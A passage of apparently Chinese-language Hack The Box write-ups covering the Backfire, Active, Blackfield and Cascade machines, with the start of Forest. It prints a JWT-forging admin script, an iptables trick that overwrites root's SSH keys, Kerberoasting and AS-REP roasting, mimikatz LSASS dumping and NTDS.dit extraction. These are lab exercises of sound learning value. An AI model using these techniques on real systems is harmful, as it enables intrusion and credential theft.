-i ~/.ssh/id_rsa ilya@backfire.htb -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000 然后运行\n# @author Siam Thanat Hack Co., Ltd. (STH)\rimport jwt\rimport datetime\rimport uuid\rimport requests\rrhost = \u0026#39;127.0.0.1:5000\u0026#39;\r# Craft Admin JWT\rsecret = \u0026#34;jtee43gt-6543-2iur-9422-83r5w27hgzaq\u0026#34;\rissuer = \u0026#34;hardhatc2.com\u0026#34;\rnow = datetime.datetime.utcnow()\rexpiration = now + datetime.timedelta(days=28)\rpayload = {\r\u0026#34;sub\u0026#34;: \u0026#34;HardHat_Admin\u0026#34;, \u0026#34;jti\u0026#34;: str(uuid.uuid4()),\r\u0026#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\u0026#34;: \u0026#34;1\u0026#34;,\r\u0026#34;iss\u0026#34;: issuer,\r\u0026#34;aud\u0026#34;: issuer,\r\u0026#34;iat\u0026#34;: int(now.timestamp()),\r\u0026#34;exp\u0026#34;: int(expiration.timestamp()),\r\u0026#34;http://schemas.microsoft.com/ws/2008/06/identity/claims/role\u0026#34;: \u0026#34;Administrator\u0026#34;\r}\rtoken = jwt.encode(payload, secret, algorithm=\u0026#34;HS256\u0026#34;)\rprint(\u0026#34;Generated JWT:\u0026#34;)\rprint(token)\r# Use Admin JWT to create a new user \u0026#39;sth_pentest\u0026#39; as TeamLead\rburp0_url = f\u0026#34;https://{rhost}/Login/Register\u0026#34;\rburp0_headers = {\r\u0026#34;Authorization\u0026#34;: f\u0026#34;Bearer {token}\u0026#34;,\r\u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;\r}\rburp0_json = {\r\u0026#34;password\u0026#34;: \u0026#34;sth_pentest\u0026#34;,\r\u0026#34;role\u0026#34;: \u0026#34;TeamLead\u0026#34;,\r\u0026#34;username\u0026#34;: \u0026#34;sth_pentest\u0026#34;\r}\rr = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)\rprint(r.text) 运行之后可以看到用户被创建成功了，随后访问https://127.0.0.1:7096/，使用用户名和密码进行登录\n来到模拟终端进行命令执行\n用相同的方式把自己的ssh密钥追加到sergej的密钥中\n然后使用ssh登录sergej，查看sudo权限命令\n搜索iptables相关的提权操作\nShielder - A Journey From sudo iptables To Local Privilege Escalation\n利用iptables提权 | CN-SEC 中文网\n其中的注释功能用来覆盖其他文件，因此可以考虑覆盖掉一些敏感文件，尤其是可以伪造root身份的\nsudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $\u0026#39;\\nYourKeysHere\\n\u0026#39; 经过测试这个comment的长度不能太长，因此ssh的密钥长度要相对短一点\n[root@kali] /home/kali/Backfire ❯ ssh-keygen -t ed25519 然后进行覆盖root的密钥文件\nsergej@backfire:~$ sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $\u0026#39;\\n your_ed25519_pub_keys\\n\u0026#39;\rsergej@backfire:~$ sudo /usr/sbin/iptables -S\rsergej@backfire:~$ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys Summary #\rUser：通过Havoc的SSRF连接到内网端口，由于触发RCE的协议是Websocket，所以需要在伪造agent之后就要将协议转换为Websocket。将两个脚本进行融合，拿到User.txt，并且写入ssh密钥进行持久化连接。\nRoot：内网端口代理出来后，发现存在绕过身份认证进行命令执行的漏洞，同样写入ssh密钥进行连接，发现存在iptables特殊权限命令，可以将任意文件进行覆盖，最后通过写入ssh密钥进行连接得到root.txt。\n","date":"2025-01-20","externalUrl":null,"permalink":"/posts/2025/01/htb-backfire/","section":"Posts","summary":"","title":"HTB-Backfire","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Easy Nmap #\r[root@kali] /home/kali/Active ❯ nmap active.htb -sV -Pn -T4 PORT STATE SERVICE VERSION\r53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\r49152/tcp open msrpc Microsoft Windows RPC\r49153/tcp open msrpc Microsoft Windows RPC\r49154/tcp open msrpc Microsoft Windows RPC\r49155/tcp open msrpc Microsoft Windows RPC\r49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r49158/tcp open msrpc Microsoft Windows RPC\r49165/tcp open msrpc Microsoft Windows RPC\r49167/tcp open msrpc Microsoft Windows RPC\rService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows SMB File Leak #\r匿名登陆SMB，发现可以读取的Replication\n[root@kali] /home/kali/Active ❯ smbclient -L //active.htb/ Password for [WORKGROUP\\root]:\rAnonymous login successful\rSharename Type Comment\r--------- ---- -------\rADMIN$ Disk Remote Admin\rC$ Disk Default share\rIPC$ IPC Remote IPC\rNETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk [root@kali] /home/kali/Active ❯ cat Groups.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt;\r\u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt;\r\u0026lt;/Groups\u0026gt; GPP-decrypt #\r经过搜索查找到了AES密钥是公开的：[MS-GPPREF]: Password Encryption | Microsoft Learn\n使用下面的脚本进行解密得到密码\n[github author=\u0026ldquo;t0thkr1s\u0026rdquo; project=\u0026ldquo;gpp-decrypt\u0026rdquo;][/github]\n[root@kali] /home/kali/Active/gpp-decrypt (master) ❯ python gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\r/home/kali/Active/gpp-decrypt/gpp-decrypt.py:10: SyntaxWarning: invalid escape sequence \u0026#39;\\ \u0026#39;\rbanner = \u0026#39;\u0026#39;\u0026#39;\r__ __ ___ _ ___ ___ ____ ___/ / ___ ____ ____ __ __ ___ / /_\r/ _ `/ / _ \\ / _ \\/___// _ / / -_)/ __/ / __/ / // / / _ \\/ __/\r\\_, / / .__/ / .__/ \\_,_/ \\__/ \\__/ /_/ \\_, / / .__/\\__/ /___/ /_/ /_/ /___/ /_/ [ * ] Password: GPPstillStandingStrong2k18 查看这个用户的SMB权限，发现可以读取Users\n[root@kali] /home/kali/Active ❯ smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.XX.XX\rDisk Permissions Comment\r---- ----------- -------\rADMIN$ NO ACCESS Remote Admin\rC$ NO ACCESS Default share\rIPC$ NO ACCESS Remote IPC\rNETLOGON READ ONLY Logon server share Replication READ ONLY\rSYSVOL READ ONLY Logon server share Users READ ONLY 拿到User.txt\n[root@kali] /home/kali/Active ❯ smbclient //active.htb/Users -U SVC_TGS Password for [WORKGROUP\\SVC_TGS]:\rTry \u0026#34;help\u0026#34; to get a list of possible commands.\rsmb: \\\u0026gt; ls\r. DR 0 Sat Jul 21 22:39:20 2018\r.. DR 0 Sat Jul 21 22:39:20 2018\rAdministrator D 0 Mon Jul 16 18:14:21 2018\rAll Users DHSrn 0 Tue Jul 14 13:06:44 2009\rDefault DHR 0 Tue Jul 14 14:38:21 2009\rDefault User DHSrn 0 Tue Jul 14 13:06:44 2009\rdesktop.ini AHS 174 Tue Jul 14 12:57:55 2009\rPublic DR 0 Tue Jul 14 12:57:55 2009\rSVC_TGS D 0 Sat Jul 21 23:16:32 2018\r5217023 blocks of size 4096. 284022 blocks available\rsmb: \\\u0026gt; cd SVC_TGS\rsmb: \\SVC_TGS\\\u0026gt; cd desktop\rsmb: \\SVC_TGS\\desktop\\\u0026gt; get user.txt\rgetting file \\SVC_TGS\\desktop\\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)\rsmb: \\SVC_TGS\\desktop\\\u0026gt; Privilege Escalation #\r在Nmap中发现开启了Kerberos服务\nGetUserSPNs 脚本能找出和普通用户账户关联的 SPN，并以 JtR (John the Ripper) 和 Hashcat 兼容的格式输出。\n简单的说，当前用户通过 GetUserSPNs 查询服务和用户之间的关联，尤其是 admin 用户所管理的服务。如果admin用户的配置存在漏洞（例如，禁用了预身份验证），那么工具就能够抓取到加密的密码哈希，进一步可以进行密码破解。\n[root@kali] /home/kali/Active ❯ impacket-GetUserSPNs -request active.htb/SVC_TGS:GPPstillStandingStrong2k18\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies ...........\r[-] CCache file is not found. Skipping...\r$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$710f30f9b647e40f3d5571b65223adf7$f40b9733880a7ef27fd7e80a1cb450dca57036d376c4cdccec590dd7a96b7445360c99f61872a50f1387be8be185759cb6406a4f8c2a99f6c68e695c7458242e64aa9295f9ff0481da1229d7f96d2745cdcd5a5bb0e3bc69b5de97xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 使用John the Ripper进行破解\n[root@kali] /home/kali/Active ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt ⏎\rUsing default input encoding: UTF-8\rLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rTicXXXXXXXXXXXXXXXX (?) 然后使用impacket-smbexec进行命令执行\n在这个工具下不能使用cd命令，可以直接读取root.txt\nSummary #\rUser：SMB文件泄露，然后进行GPP密码破解，由于5985端口（winrm）并没有打开，在SMB里拿到User.txt.\nRoot：通过Kerberoast攻击，获取到Administrator的凭证，破解后通过smbexec进行命令执行\nKerberoasting 攻击步骤：\n枚举 SPN：首先列举目标域中的所有用户和服务账户，找到与服务关联的 SPN（通常可以通过 GetUserSPNs 工具来枚举）。\n请求服务票证：攻击者向 KDC 发送请求，要求获取与服务账户相关的 服务票证（TGS）。\n提取服务票证：KDC 会返回加密的 服务票证，这个票证是用服务账户的 密码哈希 加密的。\n离线破解密码：攻击者将提取的票证（通常是加密的 RC4 哈希）带回并通过离线破解工具（如 **John the Ripper** 或 **Hashcat**）进行暴力破解，尝试恢复出服务账户的明文密码。\n值得注意的是服务票据会使用服务账户的哈希进行加密，因此任何通过身份认证的用户都能从 TGS 处请求 ST 服务票据。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以尝试破解密文。\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-active/","section":"Posts","summary":"","title":"HTB-Active","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Hard Nmap #\r[root@kali] /home/kali/Blackfield ❯ nmap Blackfield.htb -sV -T4\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows 把BLACKFIELD.local添加到**/etc/hosts**\nControl Support #\r可以使用smb匿名连接到这个目录，发现了一些类似于用户名的目录，但是里面都没东西\n将用户名全部提取出来\n[root@kali] /home/kali/Blackfield ❯ smbclient -N //BLACKFIELD.local/profiles$ -c \u0026#39;ls\u0026#39; | awk \u0026#39;{print $1}\u0026#39; \u0026gt; output.txt 使用kerbrute进行用户枚举，找到存在的用户\n[root@kali] /home/kali/Blackfield ❯ kerbrute userenum -d blackfield.local output.txt --dc 10.10.xx.xx -v -----\r[+] VALID USERNAME: audit2020@blackfield.local\r[+] VALID USERNAME: support@blackfield.local\r[+] VALID USERNAME: svc_backup@blackfield.local 把这三个用户名写入usernames.txt，测试是否开启了Kerberos预认证\n[root@kali] /home/kali/Blackfield ❯ impacket-GetNPUsers -usersfile usernames.txt -no-pass -dc-ip \u0026#34;10.10.xx.xx\u0026#34; blackfield.local/ -debug\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket\r/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow() + datetime.timedelta(days=1)\r[+] Trying to connect to KDC at 10.10.xx.xx:88\r[-] User audit2020 doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[+] Trying to connect to KDC at 10.10.xx.xx:88\r$krb5asrep$23$support@BLACKFIELD.LOCAL:aab0bba70e20145fc4a1eadbae74caf0$bf0551ac8cdc12daeade9a8e363771a63a4daa498959f53421eec21f3bf6d656352291672d3e790142453473e47a55fee161b37c0ec8ee321303d7c6afd757f6b95d0ee87a21becbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\r[+] Trying to connect to KDC at 10.10.xx.xx:88\r[-] User svc_backup doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set 使用John the Ripper进行破解得到密码\n[root@kali] /home/kali/Blackfield ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rxxxxxxxxxxxxx ($krb5asrep$23$support@BLACKFIELD.LOCAL) 使用support的账户检查SMB权限\n并没有任何泄露，winrm也登不上去\nBloodhound #\r[root@kali] /home/kali/Blackfield ❯ bloodhound-python -u support -p \u0026#39;xxxxxxxxxxx\u0026#39; -d blackfield.local -ns 10.10.xx.xx -c All 注意到support可以修改audit2020的密码\n[root@kali] /home/kali/Blackfield ❯ bloodyAD --host \u0026#39;10.10.xx.xx\u0026#39; -d \u0026#39;blackfield.local\u0026#39; -u \u0026#39;support\u0026#39; -p \u0026#39;#00^BlackKnight\u0026#39; set password \u0026#39;audit2020\u0026#39; \u0026#39;123456ABC!\u0026#39; ⏎\r[+] Password changed successfully! 修改后仍然无法使用evil-winrm，不过可以用audit2020的账户登录到SMB的forensic目录\n这两个文件比较可疑\nlsass.zip:\nLSASS (Local Security Authority Subsystem Service) 进程负责管理 Windows 操作系统中的身份验证和安全策略。它处理用户登录、账户验证和密码验证等操作。如果攻击者能够访问 LSASS 的内存转储，通常可以提取出用户凭据（如 NTLM 哈希、Kerberos 密钥等）。\n可能包含身份验证信息：用户名、密码哈希、Kerberos 密钥、票证等。\nwinlogon.zip:\nWinlogon 进程涉及 Windows 登录过程，包括用户身份验证、登录屏幕、验证登录凭证等。它处理用户登录时的身份验证流程。\n可能包含身份验证信息：用户名、登录凭证。\nMimikatz #\r把lsass.zip解压得到一个lsass.DMP，这个文件可以使用mimikatz解密\nC:\\Users\\ASUS\\Desktop\\新建文件夹\u0026gt;mimikatz.exe\r---\rmimikatz # sekurlsa::minidump lsass.DMP\rSwitch to MINIDUMP : \u0026#39;lsass.DMP\u0026#39;\rmimikatz # sekurlsa::logonpasswords full\rOpening : \u0026#39;lsass.DMP\u0026#39; file for minidump...\rAuthentication Id : 0 ; 406458 (00000000:000633ba)\rSession : Interactive from 2\rUser Name : svc_backup\rDomain : BLACKFIELD\rLogon Server : DC01\rLogon Time : 2020/2/24 2:00:03\rSID : S-1-5-21-4194615774-2175524697-3563712290-1413\rmsv :\r[00000003] Primary\r* Username : svc_backup\r* Domain : BLACKFIELD\r* NTLM : 9658d1dXXXXXXXXXXXXXXXXXXXXXXX\r* SHA1 : 463c13a9a31fc3252c68ba0a44f0221626a33e5c\r* DPAPI : a03cd8e9d30171f3cfe8caad92fef621\rtspkg :\rwdigest : 拿到了svc_bakcup的NTLM hash，然后使用winrm登录拿到user.txt\nPrivilege Escalation #\r在根目录下发现一个留言\n*Evil-WinRM* PS C:\\\u0026gt; cat notes.txt\rMates,\rAfter the domain compromise and computer forensic last week, auditors advised us to:\r- change every passwords -- Done.\r- change krbtgt password twice -- Done.\r- disable auditor\u0026#39;s account (audit2020) -- KO.\r- use nominative domain admin accounts instead of this one -- KO.\rWe will probably have to backup \u0026amp; restore things later.\r- Mike.\rPS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt) 查看svc_backup的所属组情况，发现属于一个特殊组BACKUP OPERATORS\nwhoami查看权限\n参考以下文章\nBackup Operator Privilege Escalation \u0026lt; BorderGate\nDomain Escalation – Backup Operator – Penetration Testing Lab\n尝试本地下载SAM\nreg save hklm\\sam c:\\Windows\\Tasks\\SAM\rreg save hklm\\system c:\\Windows\\Tasks\\SYSTEM 并不能使用这个hash，尝试获取到Ntds.dit\nNtds.dit包括但不限于有关域用户、组和组成员身份和凭据信息、GPP等信息。它包括域中所有用户的密码哈希值，为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。\n可以看到这个文件被占用了无法复制\nDiskShadow #\r有一种方式就是给驱动器创建卷影副本，然后我们将能够将 ntds.dit 文件复制出来，因为它不会被正在使用。\necho \u0026#34;set context persistent nowriters\u0026#34; | out-file ./diskshadow.txt -encoding ascii\recho \u0026#34;add volume c: alias temp\u0026#34; | out-file ./diskshadow.txt -encoding ascii -append\recho \u0026#34;create\u0026#34; | out-file ./diskshadow.txt -encoding ascii -append echo \u0026#34;expose %temp% z:\u0026#34; | out-file ./diskshadow.txt -encoding ascii -append\rdiskshadow.exe /s c:\\temp\\diskshadow.txt 上面的命令实质上是告诉 diskshadow.exe 创建一个 C盘 的副本，将其命名为 Z盘 并公开它（使其作为驱动器访问）。\n将NTDS.dit进行备份操作，并且下载下来\nrobocopy /b Z:\\Windows\\NTDS C:\\temp NTDS.dit\rdownload C:\\temp\\NTDS.dit 使用secretdump获取hash\n[root@kali] /home/kali/Blackfield ❯ impacket-secretsdump -system system.bak -ntds ntds.dit LOCAL \u0026gt; results.txt 拿到Administrator的hash后进行登录，拿到root.txt\n为什么这就结束了呢？上面给的notes.txt里说了最后的root.txt是加密过的。\nSummary #\rUser：SMB用户名泄露后进行Kerberos用户存在验证，通过未开启预认证的用户拿到hash，通过bloodhound进行分析可知support可修改audit的密码，audit的SMB服务里存在LSASS文件泄露，使用Mimikatz解密后拿到user.txt\nRoot：svc_backup所属组是具有备份权限的，因为不能直接拿到系统信息文件，尝试直接将C盘进行备份处理，通过影子卷盘获取到必要的系统文件。我尝试过了SYSTEM、SECURITY、SAM这三个文件进行secretdump，不过都不能利用，经过查询得知这三个是提取本地系统上的用户账户信息（本地用户和计算机账户），而不是域账户信息。NTDS.dit包含整个域控制器中域用户和计算机的账户信息、组成员身份、权限等。包括域内所有用户的密码哈希。换句话说最开始的Admin的密码哈希并不作用于域内其他机器，因此只能通过NTDS来获取到域控上的admin。\n我看有一个Writeup上最后是无法直接读取root.txt的，需要用metasploit连接木马后，使用cipher解密，似乎应该是预期的。\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-blackfield/","section":"Posts","summary":"","title":"HTB-Blackfield","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap #\r[root@kali] /home/kali/Cascade ❯ nmap Cascade.htb -sV -T4 PORT STATE SERVICE VERSION\r53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\r49154/tcp open msrpc Microsoft Windows RPC\r49155/tcp open msrpc Microsoft Windows RPC\r49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r49158/tcp open msrpc Microsoft Windows RPC\r49165/tcp open msrpc Microsoft Windows RPC\rService Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows 把cascade.local添加到**/etc/hosts**\nUserEnum #\r[root@kali] /home/kali/Cascade ❯ enum4linux -a cascade.local ----\ruser:[CascGuest] rid:[0x1f5]\ruser:[arksvc] rid:[0x452]\ruser:[s.smith] rid:[0x453]\ruser:[r.thompson] rid:[0x455]\ruser:[util] rid:[0x457]\ruser:[j.wakefield] rid:[0x45c]\ruser:[s.hickson] rid:[0x461]\ruser:[j.goodhand] rid:[0x462]\ruser:[a.turnbull] rid:[0x464]\ruser:[e.crowe] rid:[0x467]\ruser:[b.hanson] rid:[0x468]\ruser:[d.burman] rid:[0x469]\ruser:[BackupSvc] rid:[0x46a]\ruser:[j.allen] rid:[0x46e]\ruser:[i.croft] rid:[0x46f] ldapsearch #\r[root@kali] /home/kali/Cascade ❯ ldapsearch -x -b \u0026#34;dc=cascade,dc=local\u0026#34; -H ldap://cascade.local \u0026#34;(objectClass=*)\u0026#34; \u0026gt; ldapresult.txt 在Ryan用户下的信息中发现旧密码(Legacy password)，需要Base64解密\nSMB File Leak #\r使用这个账户查看SMB，发现Data可以读取\nsmb: \\IT\\Email Archives\\\u0026gt; ls\r. D 0 Wed Jan 29 02:00:30 2020\r.. D 0 Wed Jan 29 02:00:30 2020\rMeeting_Notes_June_2018.html An 2522 Wed Jan 29 02:00:12 2020\r6553343 blocks of size 4096. 1625364 blocks available 找到一个html文件，大概是说用户名和密码一样\n-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is XXXXX (password is the same as the normal admin account password). 同时在s.smith这个目录下拿到一个VNC文件\nCrack VNC Passwd #\r并且里面有密码字段，需要十六进制解密，并且顶部注意到TightVNC的字样\nfrizb/PasswordDecrypts: Handy Stored Password Decryption Techniques 解密得到密码\n登录拿到user.txt\nPrivilege Escalation #\r还有另一个用户arksvc存在\n.NET Decompile #\r用smith的账户登入SMB\n发现一个DB文件\n下载一个.net反编译工具\ndnSpy/dnSpy: .NET debugger and assembly editor 查看反编译的代码\nusing(SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader()) {\rsqliteDataReader.Read();\rstr = Conversions.ToString(sqliteDataReader[\u0026#34;Uname\u0026#34;]);\rstr2 = Conversions.ToString(sqliteDataReader[\u0026#34;Domain\u0026#34;]);\rstring text = Conversions.ToString(sqliteDataReader[\u0026#34;Pwd\u0026#34;]);\rtry {\rpassword = Crypto.DecryptString(text, \u0026#34;c4scadek3y654321\u0026#34;);\r} catch (Exception ex) {\rConsole.WriteLine(\u0026#34;Error decrypting password: \u0026#34; + ex.Message);\rreturn;\r}\r} 查看dll中的代码分析，似乎是AES加密方式\n获取到了一些必要参数\npassword = Crypto.DecryptString(text, \u0026#34;c4scadek3y654321\u0026#34;)\r---\raes.BlockSize = 128;\raes.KeySize = 128;\raes.IV = Encoding.UTF8.GetBytes(\u0026#34;1tdyjCbY1Ix49842\u0026#34;);\raes.Key = Encoding.UTF8.GetBytes(Key);\raes.Mode = CipherMode.CBC; 写一个python脚本即可解密\nfrom Crypto.Cipher import AES\rfrom Crypto.Util.Padding import unpad\rfrom Crypto.Random import get_random_bytes\rimport base64\r# 密钥和初始化向量 (IV)\rkey = b\u0026#39;c4scadek3y654321\u0026#39; # 16 字节 (128位) 密钥\riv = b\u0026#39;1tdyjCbY1Ix49842\u0026#39; # 16 字节 IV\r# 加密后的密文 (base64 编码)\rencrypted_text = \u0026#39;BQO5l5Kj9MdErXx6Q6AGOw==\u0026#39;\r# 将密文从 base64 解码成字节\rciphertext = base64.b64decode(encrypted_text)\r# 创建 AES 解密器\rcipher = AES.new(key, AES.MODE_CBC, iv)\r# 解密并去除填充\rtry:\rdecrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)\rdecrypted_text = decrypted_data.decode(\u0026#39;utf-8\u0026#39;)\rprint(\u0026#34;解密后的文本:\u0026#34;, decrypted_text)\rexcept (ValueError, KeyError) as e:\rprint(\u0026#34;解密失败:\u0026#34;, e) 现在就拿到了arksvc的权限\nBloodhound #\rarksvc属于AD RECYCLE BIN这个组，这个组授予用户读取已删除用户的权限信息\nGet-ADObject -filter \u0026#39;isDeleted -eq $true\u0026#39; -includeDeletedObjects -Properties * 拿到TempAdmin的密码，需要base64解密\n在上面的SMB泄露的那个HTML文件里不是说过吗，TempAdmin的密码和管理员的一模一样，因此可以直接登录Administrator用户，拿到root.txt\nSummary #\rUser：ldapsearch发现旧密码可以登录SMB，在SMB里拿到VNC密码文件，解密后登录拿到user.txt\nRoot：将**.NET加密工具进行反编译，判断出是AES的CBC模式加密，由于相关参数都是固定值，可以直接解密从而拿到arksvc的权限。域内分析得到arksvc具有特殊权限，可以查看被删除的用户信息，泄露出TempAdmin的密码，和上面的HTML文件呼应，最后登录管理员账户拿到root.txt**。\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-cascade/","section":"Posts","summary":"","title":"HTB-Cascade","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Easy Nmap #\r[root@kali] /home/kali/Forest ❯ nmap forest.htb -sV -T4\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\r445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\rService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 27.68 seconds 将htb.local加入**/etc/hosts**\nUserenum #\r[root@kali] /home/kali/Forest ❯ rpcclient -U \u0026#34;\u0026#34; -N 10.10.xx.xx\rrpcclient $\u0026gt; enumdomusers\ruser:[Administrator] rid:[0x1f4]\ruser:[Guest] rid:[0x1f5]\ruser:[krbtgt] rid:[0x1f6]\ruser:[DefaultAccount] rid:[0x1f7]\ruser:[$331000-VK4ADACQNUCA] rid:[0x463]\ruser:[SM_2c8eef0a09b545acb] rid:[0x464]\ruser:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]\ruser:[SM_75a538d3025e4db9a] rid:[0x466]\ruser:[SM_681f53d4942840e18] rid:[0x467]\ruser:[SM_1b41c9286325456bb] rid:[0x468]\ruser:[SM_9b69f1b9d2cc45549] rid:[0x469]\ruser:[SM_7c96b981967141ebb] rid:[0x46a]\ruser:[SM_c75ee099d0a64c91b] rid:[0x46b]\ruser:[SM_1ffab36a2f5f479cb] rid:[0x46c]\ruser:[HealthMailboxc3d7722] rid:[0x46e]\ruser:[HealthMailboxfc9daad] rid:[0x46f]\ruser:[HealthMailboxc0a90c9] rid:[0x470]\ruser:[HealthMailbox670628e] rid:[0x471]\ruser:[HealthMailbox968e74d] rid:[0x472]\ruser:[HealthMailbox6ded678] rid:[0x473]\ruser:[HealthMailbox83d6781] rid:[0x474]\ruser:[HealthMailboxfd87238] rid:[0x475]\ruser:[HealthMailboxb01ac64] rid:[0x476]\ruser:[HealthMailbox7108a4e] rid:[0x477]\ruser:[HealthMailbox0659cc1] 